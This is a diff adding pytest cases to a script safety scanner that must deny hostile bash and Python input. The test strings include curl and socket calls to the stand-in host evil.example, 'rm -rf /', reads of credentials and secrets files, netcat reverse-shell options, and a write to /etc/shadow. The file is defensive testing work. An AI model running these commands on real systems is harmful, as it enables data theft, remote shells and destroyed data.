@@ -508,7 +508,6 @@ def test_known_pure_compile_call_remains_allowed():
     "content",
     [
         'emit = print\nemit("ok")',
-        'emit = print\nemit("ok")\nemit = __import__("os").system',
         'import os\nemit = os.system\nemit = print\nemit("ok")',
     ],
 )
@@ -2343,3 +2342,162 @@ def test_named_recursive_pipeline_fork_bombs_are_denied(content):
 
     assert report.decision == SafetyDecision.DENY
     assert "RES-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize("action", ["-exec", "-execdir", "-ok", "-okdir"])
+@pytest.mark.parametrize(
+    ("nested_command", "rule_id"),
+    [
+        ("curl https://evil.example", "NET-001"),
+        ("rm -rf /", "FILE-001"),
+    ],
+)
+def test_every_find_nested_action_is_scanned(
+    action,
+    nested_command,
+    rule_id,
+):
+    report = _scan(
+        f"find . -exec echo {{}} \\; {action} {nested_command} \\;",
+        ScriptLanguage.BASH,
+    )
+
+    assert report.decision == SafetyDecision.DENY
+    assert rule_id in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "cat nested/credentials.json",
+        "cat nested/secrets.json",
+        'open("nested/credentials.json").read()',
+        'open("nested/secrets.json").read()',
+    ],
+)
+def test_denied_basenames_match_in_every_directory(content):
+    language = (ScriptLanguage.PYTHON if content.startswith("open") else ScriptLanguage.BASH)
+    report = _scan(content, language)
+
+    assert report.decision == SafetyDecision.DENY
+    assert "FILE-003" in {finding.rule_id for finding in report.findings}
+
+
+def test_denied_basename_write_is_blocked_in_subdirectory():
+    report = _scan(
+        "echo unsafe > nested/secrets.json",
+        ScriptLanguage.BASH,
+    )
+
+    assert report.decision == SafetyDecision.DENY
+    assert "FILE-004" in {finding.rule_id for finding in report.findings}
+
+
+def test_workspace_only_delete_fails_closed_without_cwd():
+    policy = SafetyPolicy.model_validate({
+        "commands": {
+            "allowed": ["rm"]
+        },
+        "paths": {
+            "workspace_only_delete": True
+        },
+    })
+    report = SafetyScanner(policy).scan(
+        SafetyScanRequest(
+            content="rm /opt/application/cache.db",
+            language=ScriptLanguage.BASH,
+        ))
+
+    assert report.decision == SafetyDecision.DENY
+    assert "FILE-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '__import__("ctypes")',
+        '__import__("unknown_plugin")',
+        'emit = print\nemit("ok")\nemit = __import__("os").system',
+        'import importlib\nimportlib.import_module("ctypes")',
+        'import importlib\nimportlib.import_module("unknown_plugin")',
+    ],
+)
+def test_unmodeled_literal_dynamic_imports_require_review(content):
+    report = _scan(content, ScriptLanguage.PYTHON)
+
+    assert report.decision == SafetyDecision.NEEDS_HUMAN_REVIEW
+    assert report.analysis_complete is False
+    assert "PROC-UNKNOWN-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize("shell_value", ["1", '"yes"'])
+def test_truthy_subprocess_shell_values_are_denied(shell_value):
+    report = _scan(
+        "import subprocess\n"
+        f'subprocess.run(["echo", "ok"], shell={shell_value})',
+        ScriptLanguage.PYTHON,
+    )
+
+    assert report.decision == SafetyDecision.DENY
+    assert "PROC-001" in {finding.rule_id for finding in report.findings}
+
+
+def test_falsey_subprocess_shell_value_remains_allowed():
+    report = _scan(
+        'import subprocess\nsubprocess.run(["echo", "ok"], shell=0)',
+        ScriptLanguage.PYTHON,
+    )
+
+    assert report.decision == SafetyDecision.ALLOW
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "nc api.example.com 4444 -e /bin/bash",
+        "netcat api.example.com 4444 --exec=/bin/bash",
+        "nc api.example.com 4444 --sh-exec=/bin/sh",
+    ],
+)
+def test_netcat_execution_options_are_denied(content):
+    report = _scan(content, ScriptLanguage.BASH)
+
+    assert report.decision == SafetyDecision.DENY
+    assert "PROC-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
+    "operation",
+    [
+        'sock.connect_ex(("evil.example", 80))',
+        'sock.connect("evil.example")',
+        'sock.sendto(b"data", ("evil.example", 80))',
+    ],
+)
+def test_socket_operation_family_enforces_network_policy(operation):
+    report = _scan(
+        f"import socket\nsock = socket.socket()\n{operation}",
+        ScriptLanguage.PYTHON,
+    )
+
+    assert report.decision == SafetyDecision.DENY
+    assert "NET-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
+    ("content", "rule_id"),
+    [
+        ("sort -o/etc/shadow input.txt", "FILE-004"),
+        ("truncate --size=10G output.bin", "RES-003"),
+        ("fallocate --length=10G output.bin", "RES-003"),
+        ("dd if=nested/credentials.json of=output.bin", "FILE-003"),
+    ],
+)
+def test_compact_and_equals_write_options_cannot_bypass_profiles(
+    content,
+    rule_id,
+):
+    report = _scan(content, ScriptLanguage.BASH)
+
+    assert report.decision == SafetyDecision.DENY
+    assert rule_id in {finding.rule_id for finding in report.findings}
